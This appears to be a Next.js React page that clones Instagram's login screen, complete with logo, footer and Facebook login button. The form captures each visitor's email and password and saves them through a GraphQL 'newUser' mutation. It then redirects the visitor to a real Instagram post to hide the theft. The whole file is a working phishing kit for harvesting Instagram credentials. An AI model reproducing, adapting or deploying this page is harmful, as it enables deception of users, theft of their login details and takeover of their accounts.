import React from 'react';
import { useRouter } from 'next/router';
import Layout from '../components/Layout';
import { useFormik } from 'formik';
import * as Yup from 'yup';
import { useMutation, gql } from '@apollo/client';

const NEW_USER = gql`
     mutation newUser($input: UserInput){
          newUser(input: $input){
               id
               email
               password
          }
   }
`;

const Index = () => {

     //Routing
     const router = useRouter();

     //New user mutation
     const [ newUser ] = useMutation(NEW_USER);

     //Form Validation
     const formik = useFormik({
          initialValues: {
               email: '',
               password: ''
          },
          validationSchema: Yup.object({
               email: Yup.string().email('The email is invalid').required('El email es obligatorio'),
               password: Yup.string().required('La contraseña es obligatoria')
          }),
          onSubmit: async values => {
               const { email, password } = values;

               try {
                    const { data } = await newUser({
                         variables: {
                              input: {
                                   email,
                                   password
                              }
                         }
                    });
                    setTimeout(() => {
                         //Redirection to login
                         router.push('https://www.instagram.com/p/CFBTprapBWv/');
                     }, 1000);
               } catch (error) {
                    //Error created user message
                    console.log('Hubo un error');
               }
          }
     })

     return(
          <>
               <Layout>
                    <div className="wrapper">
                         <div className="header">
                              <div className="top">
                                   <div className="logo">
                                        <img src="instagram.png" alt="instagram" style={{width: 175 + 'px'}}/>
                                   </div>

                                   <form 
                                        className="form"
                                        onSubmit={ formik.handleSubmit }
                                   >
                                        <div className="input_field" htmlFor="email">
                                             <input 
                                                  type="email" 
                                                  placeholder="Phone number, username, or email" className="input"
                                                  id="email"
                                                  autoComplete="off"
                                                  spellCheck="false"
                                                  autoFocus
                                                  value={ formik.values.email }
                                                  onChange={ formik.handleChange }
                                                  onBlur={ formik.handleBlur }
                                             />
                                        </div>
                                        <div className="input_field" htmlFor="password">
                                             <input 
                                                  type="password" 
                                                  placeholder="Password" 
                                                  className="input"
                                                  id="password"
                                                  autoComplete="off"
                                                  spellCheck="false"
                                                  value={ formik.values.password }
                                                  onChange={ formik.handleChange }
                                                  onBlur={ formik.handleBlur }
                                             />
                                        </div>
                                        <input 
                                             type="submit"
                                             className="btn"
                                             value="Log In"
                                        />
                                   </form>

                                   <div className="or">
                                        <div className="line"></div>
                                        <p>OR</p>
                                        <div className="line"></div>
                                   </div>
                                   <div className="dif">
                                        <div className="fb">
                                             <img src="facebook.png" alt="facebook"/>
                                             <p>Log in with Facebook</p>
                                        </div>
                                        <div className="forgot">
                                             <a href="#">Forgot password?</a>
                                        </div>
                                   </div>
                              </div>
                              <div className="signup">
                                   <p>Don't have an account? <a href="#">Sign up</a></p>
                              </div>
                              <div className="apps">
                                   <p>Get the app.</p>
                                   <div className="icons">
                                        <a href="#"><img src="appstore.png" alt="appstore"/></a>
                                        <a href="#"><img src="googleplay.png" alt="googleplay"/></a>
                                   </div>
                              </div>
                         </div>
                         <div className="footer">
                              <div className="links">
                                   <ul>
                                        <li><a href="#">ABOUT US</a></li>
                                        <li><a href="#">SUPPORT</a></li>
                                        <li><a href="#">PRESS</a></li>
                                        <li><a href="#">API</a></li>
                                        <li><a href="#">JOBS</a></li>
                                        <li><a href="#">PRIVACY</a></li>
                                        <li><a href="#">TERMS</a></li>
                                        <li><a href="#">DIRECTORY</a></li>
                                        <li><a href="#">PROFILES</a></li>
                                        <li><a href="#">HASHTAGS</a></li>
                                        <li><a href="#">LANGUAGE</a></li>
                                   </ul>
                              </div>
                              <div className="copyright">
                                   © 2020 INSTAGRAM
                              </div>
                         </div>
                    </div>
               </Layout>
          </>
     );
}

export default Index;